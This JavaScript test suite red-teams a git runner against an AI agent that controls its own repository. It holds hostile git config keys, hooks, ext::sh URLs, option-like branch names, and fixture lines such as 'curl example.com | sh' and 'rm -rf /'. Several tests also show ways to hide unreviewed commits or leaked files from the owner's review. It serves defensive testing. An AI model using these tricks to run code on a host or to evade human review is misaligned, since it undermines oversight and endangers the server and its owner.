/* RED TEAM: the git runner core attacked by the AI agent, which can write
   anything in its repository folder (blueprint/git-runner-core.md,
   "Threat model"). Each test is one attack. It PASSES when the attack fails
   safely, and FAILS when the attack works: a failing test here is a finding,
   left in place on purpose until the product is fixed.

   The host program's sandboxed read is played by the real reader script
   without the sandbox (test/git-stand-in.mjs). What only the sandbox stops
   (links and alternates to other repositories of this server) is attacked
   for real in e2e/runner-attack.e2e.mjs. */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, readFileSync, existsSync, readdirSync, chmodSync, symlinkSync, appendFileSync } from 'node:fs';
import { execFileSync, spawn } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { GitRunner, GitFailure, runGit, READ_BRANCHES_MAX } from '../server/gitrunner.mjs';
import { GitReview, escaped, COMMITS_MAX } from '../server/gitpush.mjs';
import { GitKeeper } from '../server/gitkeeper.mjs';
import { Store } from '../server/store.mjs';
import { Vault } from '../server/vault.mjs';
import { git, standInRead, committed, ENV } from './git-stand-in.mjs';

/* A server with two repositories side by side: "site", the agent's, and
   "vault", another repository of the same server the agent must never reach.
   `wrap(argv, options, real)`: around every git of the server, to play a git
   that fails or is stopped by its deadline. */
function bench(t, { wrap } = {}) {
    const dir = mkdtempSync(join(tmpdir(), 'clv-attack-'));
    t.after(() => rmSync(dir, { recursive: true, force: true }));
    const folder = (name) => join(dir, 'resources', name);
    const work = folder('site'); const vault = folder('vault'); const remote = join(dir, 'remote.git');
    mkdirSync(work, { recursive: true }); mkdirSync(vault, { recursive: true });
    git(dir, 'init', '--quiet', '--bare', '--initial-branch=main', remote);
    git(work, 'init', '--quiet', '--initial-branch=main');
    git(vault, 'init', '--quiet', '--initial-branch=main');
    const secret = committed(vault, 'secret.txt', 'the vault content\n', 'vault only');
    const markers = join(dir, 'markers'); mkdirSync(markers);
    const resources = {
        get: (name) => (['site', 'vault'].includes(name) ? { name, type: 'git' } : undefined),
        folder, originPath: (name) => folder(`${name}-origin`), hasOrigin: (name) => existsSync(join(folder(`${name}-origin`), 'HEAD')),
        makeOrigin: async (name) => { mkdirSync(folder(`${name}-origin`), { recursive: true }); }, shareOrigin: async () => {},
    };
    const calls = [];
    const builder = async (argv, options) => { calls.push(argv); return wrap ? wrap(argv, options, runGit) : runGit(argv, options); };
    const runner = new GitRunner({ dataDir: join(dir, 'data'), reserveBytes: 0, spawnRead: standInRead(folder), git: builder });
    const review = new GitReview({ store: new Store(join(dir, 'git.json')), vault: new Vault(join(dir, 'vault.key')), resources, dataDir: join(dir, 'data'), localRemotes: true, runner });
    const commit = (file, text, subject) => committed(work, file, text, subject);
    const workRoot = join(dir, 'data', 'git-work');
    return { dir, work, vault, secret, remote, markers, folder, runner, review, commit, calls, workRoot };
}

/* The read failed, as a failure of its own: never "no branches", which would
   tell the owner and the agent that there is nothing to send. */
async function failsNotEmpty(promise) {
    const error = await promise.then((got) => { got.remove?.(); return assert.fail(`it was read: ${JSON.stringify(got.branches)}`); }, (e) => e);
    assert.ok(error instanceof GitFailure, String(error));
    assert.notEqual(error.kind, 'empty', `"${error.message}" says there is nothing, when the repository could not be read`);
    return error;
}
const noMarkers = (b) => assert.deepEqual(readdirSync(b.markers), [], 'a program named by the agent ran on this server');

/* A shell command that leaves a file named `what` in the markers folder: proof that it ran. */
const touch = (b, what) => `touch ${b.markers}/${what}`;

test('attack: every setting and hook that runs a program, in .git/config, an included file and two hook folders', async (t) => {
    const b = bench(t);
    writeFileSync(join(b.work, '.gitattributes'), '* filter=evil diff=evil merge=evil\n');
    writeFileSync(join(b.work, '.mailmap'), 'Trusted Person <trusted@example.com> Tool <tool@example.com>\n');
    const first = b.commit('page.txt', 'page\n', 'a page');
    const included = join(b.dir, 'included.cfg');
    writeFileSync(included, `[core]\n\tpager = ${touch(b, 'include-pager')}\n\tfsmonitor = ${touch(b, 'include-fsmonitor')}\n[alias]\n\tbundle = !${touch(b, 'include-alias')}\n`);
    const hooks = join(b.dir, 'hooks'); mkdirSync(hooks);
    const names = ['pre-commit', 'post-checkout', 'post-merge', 'pre-push', 'reference-transaction', 'post-index-change', 'fsmonitor-watchman', 'pre-auto-gc', 'post-rewrite', 'push-to-checkout', 'pre-receive', 'update', 'post-update', 'proc-receive'];
    for (const dirOf of [hooks, join(b.work, '.git', 'hooks')]) {
        for (const n of names) { writeFileSync(join(dirOf, n), `#!/bin/sh\n${touch(b, `hook-${n}`)}\n`); chmodSync(join(dirOf, n), 0o755); }
    }
    const config = {
        'core.fsmonitor': touch(b, 'fsmonitor'), 'core.sshCommand': touch(b, 'ssh'), 'core.pager': touch(b, 'pager'), 'pager.bundle': touch(b, 'pager-bundle'),
        'alias.bundle': `!${touch(b, 'alias')}`, 'credential.helper': `!${touch(b, 'credential')}`, 'url.ext::sh.insteadOf': 'https://',
        'core.alternateRefsCommand': touch(b, 'alternate-refs'), 'uploadpack.packObjectsHook': touch(b, 'pack-hook'), 'gpg.program': touch(b, 'gpg'),
        'core.askPass': touch(b, 'askpass'), 'core.editor': touch(b, 'editor'), 'sequence.editor': touch(b, 'sequence'), 'diff.external': touch(b, 'diff-external'),
        'diff.evil.command': touch(b, 'diff-driver'), 'diff.evil.textconv': touch(b, 'textconv'), 'merge.evil.driver': touch(b, 'merge-driver'),
        'filter.evil.clean': touch(b, 'clean'), 'filter.evil.smudge': touch(b, 'smudge'), 'filter.evil.process': touch(b, 'process'),
        'core.hooksPath': hooks, 'core.gitProxy': touch(b, 'proxy'), 'protocol.allow': 'always', 'include.path': included,
        'remote.origin.url': `ext::sh -c ${touch(b, 'ext')}`, 'remote.origin.uploadpack': touch(b, 'uploadpack'), 'log.showSignature': 'true',
        'core.worktree': '/', 'pack.threads': '64',
    };
    for (const [key, value] of Object.entries(config)) git(b.work, 'config', key, value);
    const got = await b.runner.read('site');
    assert.deepEqual(got.branches, [{ name: 'main', id: first }]);
    got.remove();
    /* The review and Send run git here, on the agent's objects: nothing of its settings or files may run either. */
    b.review.setRemote('site', { url: b.remote });
    const seen = await b.review.outgoing('site');
    assert.equal(seen.state, 'ahead');
    assert.equal(seen.commits[0].author, 'Tool', 'a .mailmap in the agent\'s tree does not rename the author shown');
    await b.review.push('site', { head: first });
    assert.equal(git(b.remote, 'rev-parse', 'refs/heads/main'), first);
    noMarkers(b);
});

test('attack: .git as a gitfile, a link or with a commondir, each pointing at another repository of this server', async (t) => {
    const b = bench(t);
    b.commit('a.txt', 'a\n', 'mine');
    const real = join(b.work, '.git');
    const kept = join(b.dir, 'kept-git');
    execFileSync('mv', [real, kept]);
    const tries = {
        gitfile: () => writeFileSync(real, `gitdir: ${join(b.vault, '.git')}\n`),
        'relative gitfile': () => writeFileSync(real, 'gitdir: ../vault/.git\n'),
        link: () => symlinkSync(join(b.vault, '.git'), real),
        commondir: () => { execFileSync('cp', ['-a', kept, real]); writeFileSync(join(real, 'commondir'), `${join(b.vault, '.git')}\n`); },
        'commondir as a link': () => { execFileSync('cp', ['-a', kept, real]); symlinkSync(join(b.vault, '.git'), join(real, 'commondir')); },
    };
    for (const [what, make] of Object.entries(tries)) {
        rmSync(real, { recursive: true, force: true });
        make();
        const error = await failsNotEmpty(b.runner.read('site'));
        assert.doesNotMatch(JSON.stringify(error), new RegExp(b.secret), `${what}: the vault's commit was seen`);
        assert.deepEqual(readdirSync(b.workRoot), [], `${what}: workspace left behind`);
    }
});

test('attack: branch and ref names that look like options, paths, object ids, or hold odd bytes', async (t) => {
    const b = bench(t);
    const main = b.commit('a.txt', 'a\n', 'one');
    const other = b.commit('b.txt', 'b\n', 'two');
    git(b.work, 'reset', '--quiet', '--hard', main);
    const heads = join(b.work, '.git', 'refs', 'heads');
    /* Each odd name alone (one bad name may fail the whole read, which would
       hide what the next one does). The file name is the branch name. */
    const names = ['-f', `--upload-pack=${touch(b, 'upload-pack')}`, 'a..b', 'HEAD', 'x.lock', '@', other, `x/${other.toUpperCase()}`, `y/${'f'.repeat(64)}`,
        'sp ace', 'semi;colon', 'back\\slash', 'tilde~1', 'caret^', 'col:on', 'quest?', 'star*', 'brack[et', 'esc\u001b[31mred', 'del\u007f', '.hidden', 'z/.dot', 'a@{1}',
        /* A newline, built so that a header line taking the name whole would read "<id> refs/heads/forged". */
        `x\n${other} refs/heads/forged`];
    for (const name of names) {
        const file = join(heads, name);
        mkdirSync(join(file, '..'), { recursive: true });
        writeFileSync(file, `${other}\n`);
        const got = await b.runner.read('site').catch((e) => e);
        rmSync(join(heads, name.split('/')[0]), { recursive: true, force: true });
        if (got instanceof GitFailure) { assert.notEqual(got.kind, 'empty', `${JSON.stringify(name)}: ${got.message}`); continue; }
        const taken = got.branches.map((x) => x.name);
        got.remove();
        assert.deepEqual(taken, ['main'], `${JSON.stringify(name)} was taken as a branch: ${JSON.stringify(taken)}`);
    }
    noMarkers(b);
});

test('attack: a branch whose name is not ASCII ("café") is refused alone, not the whole repository', async (t) => {
    /* git allows such names. The header check refuses any byte outside
       printable ASCII, so one such branch makes every read of the repository
       fail, and the agent is not told which branch to rename. */
    const b = bench(t);
    const main = b.commit('a.txt', 'a\n', 'one');
    git(b.work, 'branch', 'café');
    const got = await b.runner.read('site').catch((e) => e);
    if (got instanceof GitFailure) {
        assert.ok(got.ai, `the read failed ("${got.message}") and the agent is not told what to change`);
        return;
    }
    assert.deepEqual(got.branches, [{ name: 'main', id: main }]);
    assert.equal(got.dropped.length, 1);
    got.remove();
});

test('attack: a branch named after the reviewed commit, and a branch named like the push source, change nothing that is sent', async (t) => {
    const b = bench(t);
    const base = b.commit('a.txt', 'a\n', 'base');
    b.review.setRemote('site', { url: b.remote });
    const reviewed = b.commit('b.txt', 'b\n', 'reviewed');
    const seen = await b.review.outgoing('site');
    assert.equal(seen.head, reviewed);
    /* Something the owner never saw, under names a push could pick up. */
    git(b.work, 'checkout', '--quiet', '-b', 'evil', base);
    const unseen = b.commit('backdoor.txt', 'unseen\n', 'never reviewed');
    git(b.work, 'checkout', '--quiet', 'main');
    git(b.work, 'branch', 'clavarium/send', unseen);
    git(b.work, 'update-ref', `refs/heads/x/${reviewed}`, unseen);
    git(b.work, 'update-ref', `refs/clavarium/send`, unseen);
    git(b.work, 'update-ref', `refs/tags/${reviewed}`, unseen);
    const sent = await b.review.push('site', { head: reviewed });
    assert.equal(sent.ok, true);
    assert.equal(git(b.remote, 'rev-parse', 'refs/heads/main'), reviewed);
    assert.throws(() => git(b.remote, 'cat-file', '-e', unseen), 'the unreviewed commit reached the remote');
});

test('attack: a branch renamed a -> a/b between the review and Send; a and a/b both present', async (t) => {
    const b = bench(t);
    b.commit('a.txt', 'a\n', 'one');
    b.review.setRemote('site', { url: b.remote });
    git(b.work, 'checkout', '--quiet', '-b', 'a');
    const head = b.commit('b.txt', 'b\n', 'on a');
    const seen = await b.review.outgoing('site', { branch: 'a', target: 'a' });
    assert.equal(seen.state, 'ahead');
    git(b.work, 'checkout', '--quiet', 'main');
    git(b.work, 'branch', '-m', 'a', 'a/b');
    await assert.rejects(b.review.push('site', { head, target: 'a' }), (e) => e.kind === 'agent-moved', 'the renamed branch was sent as if it were still "a"');
    assert.throws(() => git(b.remote, 'rev-parse', '--verify', 'refs/heads/a'), 'something was pushed');
    /* Both names at once (a packed, a/b loose): the blueprint says "refused,
       both named". git itself never puts both in the bundle: it drops the
       packed "a" without a word, so the read succeeds with "a" missing, and
       the clash check of the server can never fire. */
    git(b.work, 'pack-refs', '--all');
    appendFileSync(join(b.work, '.git', 'packed-refs'), `${head} refs/heads/a\n`);
    const error = await failsNotEmpty(b.runner.read('site'));
    assert.equal(error.kind, 'clash', error.message);
    assert.match(error.message, /\ba\b.*\ba\/b\b/);
});

test('attack: a shallow repository and a graft file hide parents without a prerequisite line', async (t) => {
    /* git writes no "-<id>" line for these: the pack simply lacks the
       parents. index-pack must refuse it, and the agent is told what to do. */
    for (const kind of ['shallow', 'grafts']) {
        const b = bench(t);
        b.commit('a.txt', 'a\n', 'one');
        const tip = b.commit('b.txt', 'b\n', 'two');
        if (kind === 'shallow') writeFileSync(join(b.work, '.git', 'shallow'), `${tip}\n`);
        else { mkdirSync(join(b.work, '.git', 'info'), { recursive: true }); writeFileSync(join(b.work, '.git', 'info', 'grafts'), `${tip}\n`); }
        const error = await failsNotEmpty(b.runner.read('site'));
        assert.deepEqual(readdirSync(b.workRoot), []);
        if (kind === 'shallow') assert.match(String(error.ai), /unshallow|shallow/, `a shallow repository is refused as "${error.message}", and the agent is never told it is shallow`);
    }
});

test('attack: refs that loop or point nowhere make the only branch vanish: "no branches" is said', async (t) => {
    /* A loose ref "ref: refs/heads/main" in refs/heads/main: git skips it
       silently, bundles nothing and exits 128 with the 17 bytes of an empty
       bundle, which the server takes for "nothing committed". */
    const b = bench(t);
    b.commit('a.txt', 'a\n', 'one');
    writeFileSync(join(b.work, '.git', 'refs', 'heads', 'main'), 'ref: refs/heads/main\n');
    await failsNotEmpty(b.runner.read('site'));
});

test('attack: a ref that is a symbolic ref outside refs/heads makes the read fail, said, never "nothing"', async (t) => {
    const b = bench(t);
    const main = b.commit('a.txt', 'a\n', 'one');
    git(b.work, 'update-ref', 'refs/remotes/origin/x', main);
    writeFileSync(join(b.work, '.git', 'refs', 'heads', 'alias'), 'ref: refs/remotes/origin/x\n');
    const got = await b.runner.read('site').catch((e) => e);
    if (got instanceof GitFailure) { assert.notEqual(got.kind, 'empty'); return; }
    assert.ok(got.branches.every((x) => x.id === main));
    got.remove();
});

test('attack: many refs -- 1001 branches refused with a reason the agent is told, 1000 allowed', async (t) => {
    const b = bench(t);
    const main = b.commit('a.txt', 'a\n', 'one');
    const packed = join(b.work, '.git', 'packed-refs');
    const lines = (n, name) => Array.from({ length: n }, (_, i) => `${main} refs/heads/${name(i)}\n`).join('');
    writeFileSync(packed, `# pack-refs with: peeled fully-peeled \n${lines(READ_BRANCHES_MAX, (i) => `b${String(i).padStart(4, '0')}`)}`);
    rmSync(join(b.work, '.git', 'refs', 'heads', 'main'));
    const got = await b.runner.read('site');
    assert.equal(got.branches.length, READ_BRANCHES_MAX);
    got.remove();
    writeFileSync(packed, `# pack-refs with: peeled fully-peeled \n${lines(READ_BRANCHES_MAX + 1, (i) => `b${String(i).padStart(4, '0')}`)}`);
    const many = await failsNotEmpty(b.runner.read('site'));
    assert.equal(many.kind, 'many');
    assert.match(many.ai, /delete branches/);
});

test('attack: 1000 branches with long but valid names: the header limit refuses them, and the agent is told why', async (t) => {
    /* 1000 names of 150 characters: valid for git and for branchProblem, under
       the 1000-branch limit, but 200 KB of header. The read fails as "could
       not be read safely: the header is larger than 128 KiB", ai = null. */
    const b = bench(t);
    const main = b.commit('a.txt', 'a\n', 'one');
    const long = (i) => `${'x'.repeat(145)}${String(i).padStart(4, '0')}`;
    writeFileSync(join(b.work, '.git', 'packed-refs'), `# pack-refs with: peeled fully-peeled \n${Array.from({ length: READ_BRANCHES_MAX }, (_, i) => `${main} refs/heads/${long(i)}\n`).join('')}`);
    const error = await failsNotEmpty(b.runner.read('site'));
    assert.ok(error.ai, `refused ("${error.message}") and the agent is never told: it cannot find out what to change`);
});

test('attack: commits, ref packing and gc arriving during reads: every read is whole or a failure, never "nothing"', async (t) => {
    const b = bench(t);
    b.commit('a.txt', 'a\n', 'one');
    git(b.work, 'branch', 'side');
    /* The agent rewrites its branches as fast as it can while the server reads. */
    const loop = spawn('sh', ['-c', `cd "${b.work}" || exit 1
i=0
while :; do
  i=$((i+1))
  t=$(git write-tree)
  c=$(echo "c$i" | git commit-tree "$t" -p main)
  git update-ref refs/heads/main "$c"
  git update-ref refs/heads/side "$c"
  git branch -f "tmp$((i % 5))" "$c"
  [ $((i % 7)) -eq 0 ] && git pack-refs --all --prune
  [ $((i % 23)) -eq 0 ] && git gc --quiet --prune=now
done`], { env: ENV, stdio: 'ignore', detached: true });
    const stop = () => { try { process.kill(-loop.pid, 'SIGKILL'); } catch { /* gone */ } };
    t.after(stop);
    const kinds = {};
    try {
    for (let i = 0; i < 25; i++) {
        const got = await b.runner.read('site').catch((e) => e);
        if (got instanceof GitFailure) {
            kinds[got.kind] = (kinds[got.kind] ?? 0) + 1;
            assert.notEqual(got.kind, 'empty', `read ${i}: "${got.message}" while main and side always existed`);
            continue;
        }
        kinds.ok = (kinds.ok ?? 0) + 1;
        const names = got.branches.map((x) => x.name);
        assert.ok(names.includes('main') && names.includes('side'), `read ${i}: a branch is missing: ${names}`);
        for (const x of got.branches) assert.equal(git(got.path, 'cat-file', '-t', x.id), 'commit');
        got.remove();
    }
    } finally { stop(); }
    t.diagnostic(`reads during the loop: ${JSON.stringify(kinds)}`);
});

test('attack: a remote that moved -- rewritten, deleted, renamed a -> a/b -- between the review and Send', async (t) => {
    const b = bench(t);
    const one = b.commit('a.txt', 'a\n', 'one');
    b.review.setRemote('site', { url: b.remote });
    await b.review.outgoing('site');
    await b.review.push('site', { head: one });
    const mine = b.commit('b.txt', 'b\n', 'mine');
    await b.review.outgoing('site');
    /* Rewritten by somebody else: a commit that does not contain ours. */
    const other = join(b.dir, 'other');
    git(b.dir, 'clone', '--quiet', b.remote, other);
    git(other, 'commit', '--quiet', '--amend', '-m', 'rewritten');
    git(other, 'push', '--quiet', '--force', 'origin', 'main');
    const rewritten = git(other, 'rev-parse', 'HEAD');
    await assert.rejects(b.review.push('site', { head: mine }), (e) => e.kind === 'remote-moved');
    assert.equal(git(b.remote, 'rev-parse', 'refs/heads/main'), rewritten, 'the rewritten remote was overwritten');
    /* Deleted: a lease on "absent" would be wrong, the review was against a tip. */
    git(b.work, 'fetch', '--quiet', b.remote, 'main');
    git(b.work, 'reset', '--quiet', '--hard', 'FETCH_HEAD');
    const again = b.commit('c.txt', 'c\n', 'again');
    assert.equal((await b.review.outgoing('site')).state, 'ahead');
    git(b.remote, 'branch', 'keep', 'main');
    git(b.remote, 'update-ref', '-d', 'refs/heads/main');
    await assert.rejects(b.review.push('site', { head: again }), (e) => e.kind === 'remote-moved', 'a deleted target was made again from an old review');
    assert.throws(() => git(b.remote, 'rev-parse', '--verify', 'refs/heads/main'));
    /* Renamed a -> a/b on the remote: the reference follows (prune before fetch), nothing breaks. */
    git(b.remote, 'branch', 'a', 'keep');
    assert.equal((await b.review.refresh('site')).ok, true);
    git(b.remote, 'update-ref', '-d', 'refs/heads/a');
    git(b.remote, 'branch', 'a/b', 'keep');
    const fresh = await b.review.refresh('site');
    assert.equal(fresh.ok, true, fresh.message);
    assert.equal(git(b.folder('site-origin'), 'rev-parse', 'refs/heads/a/b'), git(b.remote, 'rev-parse', 'keep'));
    assert.ok(fresh.rewritten.some((w) => w.branch === 'a' && w.now === null), 'the deletion of a is said');
});

test('attack: Send of what was not reviewed -- never reviewed, another target, amended, branch swapped', async (t) => {
    const b = bench(t);
    const base = b.commit('a.txt', 'a\n', 'one');
    b.review.setRemote('site', { url: b.remote });
    const head = b.commit('b.txt', 'b\n', 'two');
    await assert.rejects(b.review.push('site', { head }), (e) => e.kind === 'look', 'sent without a review');
    await b.review.outgoing('site');
    await assert.rejects(b.review.push('site', { head, target: 'release' }), (e) => e.kind === 'look', 'sent to a target that was never shown');
    await assert.rejects(b.review.push('site', { head: base }), (e) => e.kind === 'look', 'sent an id that was not the reviewed head');
    await assert.rejects(b.review.push('site', { head: `${head.slice(0, 39)}` }), (e) => e.kind === 'look');
    await assert.rejects(b.review.push('site', { head: head.toUpperCase() }), (e) => e.kind === 'look');
    /* Branch swapped: main now elsewhere, another branch at the reviewed id. */
    git(b.work, 'branch', 'copy', head);
    git(b.work, 'reset', '--quiet', '--hard', base);
    const swapped = b.commit('c.txt', 'swapped\n', 'swapped');
    await assert.rejects(b.review.push('site', { head }), (e) => e.kind === 'agent-moved');
    assert.throws(() => git(b.remote, 'cat-file', '-e', swapped), 'the swapped commit reached the remote');
    assert.throws(() => git(b.remote, 'rev-parse', '--verify', 'refs/heads/main'), 'something was pushed');
});

test('attack: a huge blob is imported but cannot hide: the review says it is the largest and asks to confirm', async (t) => {
    const b = bench(t);
    b.commit('a.txt', 'a\n', 'one');
    writeFileSync(join(b.work, 'big.bin'), Buffer.alloc(48 * 1024 * 1024, 0x41));
    git(b.work, 'add', 'big.bin'); git(b.work, 'commit', '--quiet', '-m', 'big');
    const seen = await b.review.outgoing('site');
    assert.equal(seen.state, 'no-remote');
    assert.equal(seen.guards.largest[0].size, 48 * 1024 * 1024);
    assert.equal(seen.cut, true);
    assert.equal(seen.guards.confirm, true);
});

test('attack: a failing count in the review reads as "everything is already there"', async (t) => {
    /* Every git of the review may fail or meet its deadline (120 s, a long
       history makes it). `rev-list --count` failing gives count 0, and count
       0 is state "up-to-date": the owner is told nothing is to be sent. */
    const b = bench(t, { wrap: async (argv, options, real) => (argv.includes('rev-list') && argv.includes('--count') && options.env?.GIT_DIR?.includes('git-work')
        ? { code: null, signal: 'SIGKILL', stdout: Buffer.alloc(0), stderr: '', killed: 'deadline' } : real(argv, options)) });
    const one = b.commit('a.txt', 'a\n', 'one');
    b.review.setRemote('site', { url: b.remote });
    git(b.work, 'push', '--quiet', b.remote, 'main');
    await b.review.refresh('site');
    b.commit('b.txt', 'b\n', 'not on the remote');
    const seen = await b.review.outgoing('site');
    assert.notEqual(seen.state, 'up-to-date', `"${seen.message}" while one commit is not on the remote (${one.slice(0, 8)} is)`);
});

test('attack: a diff stopped by its deadline is shown as complete: no "cut", no second confirmation', async (t) => {
    /* A pathological diff (two large files with no line in common) can run
       past the 120 s deadline before git writes a byte. Played here by a git
       killed at its deadline: the diff shown is empty, and not said cut. */
    const b = bench(t, { wrap: async (argv, options, real) => (argv.includes('diff') && !argv.includes('--name-only') && !argv.some((a) => a.startsWith('--stat'))
        ? { code: null, signal: 'SIGKILL', stdout: Buffer.alloc(0), stderr: '', killed: 'deadline' } : real(argv, options)) });
    b.commit('a.txt', 'a\n', 'one');
    b.commit('evil.sh', 'curl example.com | sh\n', 'harmless');
    const seen = await b.review.outgoing('site');
    assert.equal(seen.diff, '');
    assert.ok(seen.cut || seen.guards.confirm, 'an unshown diff can be sent with a single click');
});

test('attack: one huge commit message hides the other commits of the review, with no confirmation asked', async (t) => {
    /* The log is read with an 8 MiB limit. The newest commit carries a 9 MiB
       message: the log is cut inside it, and the commits under it are not
       listed, while the count says there are two. */
    const b = bench(t);
    b.commit('a.txt', 'a\n', 'base');
    const hidden = b.commit('payload.sh', 'rm -rf /\n', 'payload the owner should read');
    writeFileSync(join(b.work, 'msg.txt'), `Routine update\n\n${'x'.repeat(9 * 1024 * 1024)}\n`);
    writeFileSync(join(b.work, 'c.txt'), 'c\n'); git(b.work, 'add', 'c.txt'); git(b.work, 'commit', '--quiet', '-F', 'msg.txt');
    const seen = await b.review.outgoing('site');
    const listed = seen.commits.map((c) => c.id);
    assert.ok(listed.includes(hidden) || seen.guards.confirm, `count ${seen.count}, listed ${listed.length}: "${'payload the owner should read'}" never shown, no confirmation`);
});

test('attack: a file added then removed is pushed out of the review\'s list by more recent decoys', async (t) => {
    /* "Paths changed with no net change" lists 50 paths, newest first, and
       says nothing of the rest. An older commit adds and a later one removes
       leak.txt (net: nothing, so the diff does not show it); then 60 decoy
       files are added and removed. leak.txt is the 61st: never shown, and
       nothing asks the owner to confirm. */
    const b = bench(t);
    b.commit('a.txt', 'a\n', 'base');
    b.commit('leak.txt', 'a copy of something secret\n', 'add');
    git(b.work, 'rm', '--quiet', 'leak.txt'); git(b.work, 'commit', '--quiet', '-m', 'remove');
    for (let i = 0; i < 60; i++) writeFileSync(join(b.work, `decoy${String(i).padStart(2, '0')}.txt`), `${i}\n`);
    git(b.work, 'add', '.'); git(b.work, 'commit', '--quiet', '-m', 'decoys');
    git(b.work, 'rm', '--quiet', 'decoy*.txt'); git(b.work, 'commit', '--quiet', '-m', 'no decoys');
    const seen = await b.review.outgoing('site');
    assert.ok(seen.guards.unchanged.includes('leak.txt') || seen.guards.confirm, `the review lists ${seen.guards.unchanged.length} paths added and removed, not leak.txt, and asks for no confirmation`);
});

test('attack: characters that hide text in the review are written out', () => {
    /* Bidirectional marks are escaped; these others hide or break text on a page too. */
    for (const c of ['​', '‍', ' ', ' ', '﻿', '­', '⁠', 'ㅤ', '\u{e0041}']) {
        assert.notEqual(escaped(`a${c}b`), `a${c}b`, `U+${c.codePointAt(0).toString(16).padStart(4, '0')} is shown as it is`);
    }
});

test('attack: one repository whose reads hang holds up every other repository of the server', async (t) => {
    /* The keeper reads repositories one after the other in each tick. An
       agent whose read takes the whole time limit (a FIFO in .git, a huge
       repository: 300 s in the sandbox, 360 s here) delays the reads,
       refreshes and automatic sendings of all the others by as much, and a
       change of its marks asks for that read again at the next tick. */
    const dir = mkdtempSync(join(tmpdir(), 'clv-attack-keep-'));
    t.after(() => rmSync(dir, { recursive: true, force: true }));
    const started = {};
    const t0 = Date.now();
    const review = {
        listen() {}, useWaivers() {}, remoteOf: () => 'https://git.example.com/x.git', refresh: async () => ({ ok: true }), upkeep: async () => {},
        readTips: async (name) => { started[name] = Date.now() - t0; if (name === 'slow') await new Promise((r) => setTimeout(r, 3000)); return {}; },
        tips: () => ({}), runner: null,
        /* A remote whose default branch is known: try/* needs nobody's word. */
        defaultBranch: () => 'main',
    };
    const list = [{ name: 'slow', type: 'git', attachments: { alpha: 'write' } }, { name: 'fast', type: 'git', attachments: { alpha: 'write' } }];
    const resources = { get: (n) => list.find((x) => x.name === n), list: () => list, folder: (n) => join(dir, n), hasOrigin: () => false };
    const keeper = new GitKeeper({ store: new Store(join(dir, 'keep.json')), review, resources, checks: { machineFor: async () => 'alpha', runs: async () => true, run: async () => ({ status: 'none' }) }, alerts: null });
    for (const x of list) { keeper.set(x.name, { refreshMinutes: 0 }); keeper.setAuto(x.name, 'alpha', { branches: ['try/*'] }); }
    await keeper.tick();
    assert.ok(started.fast < 1000, `the read of "fast" waited ${started.fast} ms behind "slow"`);
});
